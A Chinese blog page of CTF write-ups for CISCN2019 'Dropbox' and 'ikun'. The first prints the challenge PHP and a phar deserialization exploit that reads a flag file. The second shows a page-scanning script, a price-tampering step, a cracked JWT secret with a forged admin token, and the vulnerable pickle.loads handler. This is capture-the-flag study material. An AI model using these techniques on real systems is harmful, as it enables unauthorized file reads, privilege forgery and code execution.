<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>CISCN2019 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CISCN2019</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">CISCN2019</h1><div class="post-meta"><a href="/2020/01/22/CISCN2019/#comments" class="comment-count"></a><p><span class="date">Jan 22, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><h2 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h2><p>先注册一个账号，登陆之后上传一个正常的图片，在测试下载功能的时候发现有任意文件下载<br>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">"dropbox"</span>;</span><br><span class="line"><span class="variable">$db</span> = new mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        global <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> user_exist(<span class="variable">$username</span>) &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === 0) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> add_user(<span class="variable">$username</span>, <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"ss"</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> verify_user(<span class="variable">$username</span>, <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private <span class="variable">$files</span>;</span><br><span class="line">    private <span class="variable">$results</span>;</span><br><span class="line">    private <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$path</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;files = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;results = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;funcs = array();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">"."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">".."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$filenames</span> as <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = new File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$args</span>) &#123;</span><br><span class="line">        array_push(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;files as <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;funcs as <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;results as <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            foreach (<span class="variable">$result</span> as <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> open(<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">name</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> basename(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">size</span></span>() &#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = array(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$size</span> &gt;= 1024 &amp;&amp; <span class="variable">$i</span> &lt; 4; <span class="variable">$i</span>++) <span class="variable">$size</span> /= 1024;</span><br><span class="line">        <span class="built_in">return</span> round(<span class="variable">$size</span>, 2).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">detele</span></span>() &#123;</span><br><span class="line">        unlink(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">close</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>download.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br><span class="line"><span class="variable">$file</span> = new File();</span><br><span class="line"><span class="variable">$filename</span> = (string) <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; 40 &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">"flag"</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>delete<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br><span class="line"><span class="variable">$file</span> = new File();</span><br><span class="line"><span class="variable">$filename</span> = (string) <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; 40 &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; <span class="literal">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="built_in">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; <span class="literal">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="built_in">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用download.php中的$file-&gt;close();<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">close</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>构造链子<br>先看filelist::destruct只有一个echo可以触发tostring，可是没有tostring23333，然后看call的<code>$file-&gt;$func();</code><br>可以调用任意函数，再看到上面file类的close方法，可以读文件，下面想的是如何触发call，看了一圈没找到触发call的地方2333<br>看了wp发现自己少看了一个user类，user::destruct<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>直接调用了close，还触发个鬼的call，我真是个憨憨<br>后来发现这样不行，直接file_get_contents，没有输出函数的话，是没得回显的<br>这里要感谢p3师傅，帮我解决了很多小问题<br>所以db必须是filelist类，触发call之后，再调用file的close，再回到filelist的destruct，最后有个echo输出读取内容<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private <span class="variable">$files</span>;</span><br><span class="line">    private <span class="variable">$results</span>;</span><br><span class="line">    private <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$file</span> = new File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;files = array(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;results = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;funcs = array();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = new User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = new FileList();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'test.phar'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>然后就是触发的地方，有download.php和delete.php，都是通过if里面的file类的open函数里的file_exists和is_dir触发，is_dir再处理<br>phar://时返回值为true，所以都是返回File not exist，也都触发了反序列化，但是downLoad.php有这么一句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>basedir限制了访问目录，chdir绕过basedir正常访问上传的文件，但是在触发反序列化读取flag文件时，flag在根目录，读取失败<br>所以只能在delete页面触发反序列化<br><img src="https://uploader.shimo.im/f/ctyPCxjB3t8owOlM.png!thumbnail" alt></p>
<h2 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h2><p>复现一波，附上<a href="https://blog.csdn.net/qq_26406447/article/details/91964502" target="_blank" rel="noopener">参考wp</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    url=<span class="string">"http://516c2c78-bb2b-4dff-848b-2aebadfc0832.node3.buuoj.cn/shop?page=&#123;&#125;"</span></span><br><span class="line">    url=url.format(i)</span><br><span class="line">    p=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"lv6.png"</span> <span class="keyword">in</span> p.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功"</span>)</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>跑出来是181页然后到购买页面点结算，把折扣改为一个很小的数<br><img src="https://uploader.shimo.im/f/1Q6wmDhkfjAd3QH5.png!thumbnail" alt><br>302转到/b1g_m4mber，然后提示只有admin能访问<br>cookie里有个jwt值（JSON Web Token）然后到 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 解析<br>上面那个有点卡 <a href="http://jwt.calebb.net/" target="_blank" rel="noopener">http://jwt.calebb.net/</a>  这个也行<br><img src="https://uploader.shimo.im/f/3iXeOY9SyVsVYfbK.png!thumbnail" alt><br>可以看到解析结果里面有用户名，把用户名改为admin，再用跑出来的密钥加密一下就能得到admin的jwt了<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a><br><img src="https://uploader.shimo.im/f/dWgKbmIiBjQk6Vev.png!thumbnail" alt><br>密钥是1Kun<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br>修改之后f12发现<br><img src="https://uploader.shimo.im/f/gdS3uLtYqhw3LNr7.png!thumbnail" alt><br>下载源码审计admin.py<br>因为没有接触过python反序列化，这里直接记录下师傅的pyload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=0)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=0)</span><br></pre></td></tr></table></figure></p>
